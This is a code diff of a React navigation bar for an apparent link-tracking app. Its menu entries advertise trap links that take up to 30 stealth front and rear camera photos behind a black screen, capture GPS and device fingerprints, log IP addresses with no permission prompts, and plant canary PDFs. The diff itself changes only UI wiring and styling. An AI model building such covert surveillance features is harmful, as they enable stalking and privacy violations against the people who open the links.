@@ -20,6 +20,7 @@ import {
 } from 'lucide-react';
 import { Language, translations } from '../translations';
 import { Cpu, BookOpen, Camera } from 'lucide-react';
+import { TrackingMode } from '../types';
 
 export type MainNavView = 'home' | 'ip-lookup' | 'support' | 'track' | 'mac-lookup' | 'exif-tool' | 'cyber-awareness';
 
@@ -29,6 +30,7 @@ interface NavbarProps {
   onGoHome: () => void;
   activeView: MainNavView;
   onChangeView: (view: MainNavView) => void;
+  onOpenTrapModal?: (mode: TrackingMode) => void;
   savedCount: number;
   onOpenSaved: () => void;
 }
@@ -39,6 +41,7 @@ export const Navbar: React.FC<NavbarProps> = ({
   onGoHome,
   activeView,
   onChangeView,
+  onOpenTrapModal,
   savedCount,
   onOpenSaved,
 }) => {
@@ -50,6 +53,7 @@ export const Navbar: React.FC<NavbarProps> = ({
   const navItems: {
     id: string;
     view?: MainNavView;
+    trapMode?: TrackingMode;
     action?: () => void;
     label: string;
     desc: string;
@@ -59,77 +63,45 @@ export const Navbar: React.FC<NavbarProps> = ({
   }[] = [
     {
       id: 'sec-home',
-      view: 'home',
-      label: lang === 'ar' ? '1. الرئيسية وإنشاء الروابط' : '1. Home & Link Generator',
-      desc: lang === 'ar' ? 'إنشاء روابط التتبع الفوري والموجه الذكي' : 'Create smart tracking and auto-redirect links',
+      trapMode: 'precise',
+      label: lang === 'ar' ? '1. الرئيسية وتلغيم الروابط الذكية' : '1. Link Trap Generator',
+      desc: lang === 'ar' ? 'تلغيم وإنشاء روابط التتبع الفوري والموجه الذكي' : 'Create smart tracking and auto-redirect links',
       icon: <Link2 className="w-4 h-4 text-indigo-600" />,
       badge: 'Core',
       badgeColor: 'bg-indigo-100 text-indigo-700',
     },
     {
       id: 'sec-camera',
-      action: () => {
-        onChangeView('home');
-        setTimeout(() => {
-          const btn = document.getElementById('btn-mode-camera');
-          if (btn) btn.click();
-          const input = document.getElementById('target-url-input');
-          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 100);
-      },
-      label: lang === 'ar' ? '2. نظام فخ الكاميرا (20 صورة)' : '2. Camera Trap Surveillance',
-      desc: lang === 'ar' ? 'شاشة سوداء صامتة والتقاط متسلسل بين الكاميرا الأمامية والخلفية' : '20 sequential photos front/rear stealth capture',
+      trapMode: 'camera',
+      label: lang === 'ar' ? '2. نظام فخ الكاميرا (كحد أقصى 30 صورة)' : '2. Camera Trap Surveillance (Max 30 Photos)',
+      desc: lang === 'ar' ? 'تلغيم رابط يلتقط صورة كل ثانية بالتناوب بين الأمامية والخلفية بشاشة سوداء' : 'Up to 30 sequential photos front/rear stealth capture every 1s',
       icon: <Camera className="w-4 h-4 text-rose-600" />,
-      badge: '20 PHOTOS',
+      badge: 'CAMERA',
       badgeColor: 'bg-rose-100 text-rose-700',
     },
     {
       id: 'sec-gps',
-      action: () => {
-        onChangeView('home');
-        setTimeout(() => {
-          const btn = document.getElementById('btn-mode-precise');
-          if (btn) btn.click();
-          const input = document.getElementById('target-url-input');
-          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 100);
-      },
-      label: lang === 'ar' ? '3. التتبع الجغرافي GPS والمستشعرات' : '3. High-Accuracy GPS Tracker',
-      desc: lang === 'ar' ? 'إحداثيات قمر صناعي بالأمتار وبطارية ومعالج رسومي GPU' : 'Satellite GPS coordinates, battery & GPU fingerprint',
+      trapMode: 'precise',
+      label: lang === 'ar' ? '3. تحديد إحداثيات (GPS والمستشعرات)' : '3. High-Accuracy GPS Tracker',
+      desc: lang === 'ar' ? 'تلغيم رابط يرصد إحداثيات قمر صناعي بالأمتار وبطارية ومعالج GPU' : 'Satellite GPS coordinates, battery & GPU fingerprint',
       icon: <Crosshair className="w-4 h-4 text-indigo-600" />,
       badge: 'GPS',
       badgeColor: 'bg-indigo-100 text-indigo-700',
     },
     {
       id: 'sec-silent-ip',
-      action: () => {
-        onChangeView('home');
-        setTimeout(() => {
-          const btn = document.getElementById('btn-mode-near');
-          if (btn) btn.click();
-          const input = document.getElementById('target-url-input');
-          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 100);
-      },
+      trapMode: 'near',
       label: lang === 'ar' ? '4. التتبع الصامت للشبكة وIP' : '4. Silent Near IP Intelligence',
-      desc: lang === 'ar' ? 'رصد فوري للعنوان والدولة والمزود ونوع الخط بدون أي نوافذ إذن' : 'Silent IP, country, ISP, and network medium with zero prompts',
+      desc: lang === 'ar' ? 'تلغيم رابط يرصد IP والدولة والمزود ونوع الخط بدون أي نوافذ إذن' : 'Silent IP, country, ISP, and network medium with zero prompts',
       icon: <Radio className="w-4 h-4 text-emerald-600" />,
       badge: 'Silent',
       badgeColor: 'bg-emerald-100 text-emerald-700',
     },
     {
       id: 'sec-pdf-canary',
-      action: () => {
-        onChangeView('home');
-        setTimeout(() => {
-          const btn = document.getElementById('btn-mode-pdf');
-          if (btn) btn.click();
-          const input = document.getElementById('target-url-input');
-          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 100);
-      },
+      trapMode: 'pdf',
       label: lang === 'ar' ? '5. تتبع وثائق ومستندات الـ PDF' : '5. Canary PDF Document Tracker',
-      desc: lang === 'ar' ? 'ملفات وثائق PDF استخبارية ترصد فتح المستند وموقع الفاتح فوراً' : 'Embedded canary tokens logging remote PDF openings',
+      desc: lang === 'ar' ? 'تلغيم مستند PDF استخباري يرصد فتح المستند وموقع الفاتح فوراً' : 'Embedded canary tokens logging remote PDF openings',
       icon: <FileText className="w-4 h-4 text-amber-600" />,
       badge: 'PDF',
       badgeColor: 'bg-amber-100 text-amber-700',
@@ -199,26 +171,26 @@ export const Navbar: React.FC<NavbarProps> = ({
   return (
     <>
       <header className="sticky top-0 z-40 w-full bg-white border-b border-slate-200 shadow-sm transition-colors">
-        <div className="max-w-6xl mx-auto px-3 sm:px-6 h-16 flex items-center justify-between gap-2">
+        <div className="max-w-6xl mx-auto px-3 sm:px-6 h-13 sm:h-14 flex items-center justify-between gap-2">
           {/* Left: 3-Bars Hamburger Button + Brand */}
-          <div className="flex items-center gap-2 sm:gap-3">
+          <div className="flex items-center gap-1.5 sm:gap-2">
             {/* 3-Bars Menu Button */}
             <button
               id="btn-main-menu-drawer"
               onClick={() => setDrawerOpen(true)}
-              className="p-2 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-200 transition-all active:scale-95 cursor-pointer flex items-center justify-center"
+              className="p-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-200 transition-all active:scale-95 cursor-pointer flex items-center justify-center"
               title={lang === 'ar' ? 'القائمة والأقسام' : 'Menu & Sections'}
             >
-              <Menu className="w-5 h-5 text-indigo-700" />
+              <Menu className="w-4 h-4 text-indigo-700" />
             </button>
 
             {/* Logo and Brand */}
             <div
               id="brand-header"
               onClick={onGoHome}
-              className="flex items-center gap-2 cursor-pointer group select-none transition-transform active:scale-98 shrink-0"
+              className="flex items-center gap-1.5 cursor-pointer group select-none transition-transform active:scale-98 shrink-0"
             >
-              <div className="relative w-9 h-9 rounded-full overflow-hidden p-0.5 border-2 border-indigo-600 bg-white shadow-sm group-hover:border-indigo-700 group-hover:shadow-md transition-all">
+              <div className="relative w-7.5 h-7.5 rounded-full overflow-hidden p-0.5 border-2 border-indigo-600 bg-white shadow-2xs group-hover:border-indigo-700 group-hover:shadow-xs transition-all">
                 <img
                   src={logoUrl}
                   alt={t.logoAlt}
@@ -230,8 +202,8 @@ export const Navbar: React.FC<NavbarProps> = ({
                 />
               </div>
 
-              <div className="flex items-center gap-1.5">
-                <span className="text-lg sm:text-xl font-black tracking-tight text-indigo-950 font-sans">
+              <div className="flex items-center gap-1">
+                <span className="text-sm sm:text-base font-black tracking-tight text-indigo-950 font-sans">
                   {t.appName}
                 </span>
               </div>
@@ -385,7 +357,9 @@ export const Navbar: React.FC<NavbarProps> = ({
                     <button
                       key={item.id}
                       onClick={() => {
-                        if (item.action) {
+                        if (item.trapMode && onOpenTrapModal) {
+                          onOpenTrapModal(item.trapMode);
+                        } else if (item.action) {
                           item.action();
                         } else if (item.view) {
                           onChangeView(item.view);
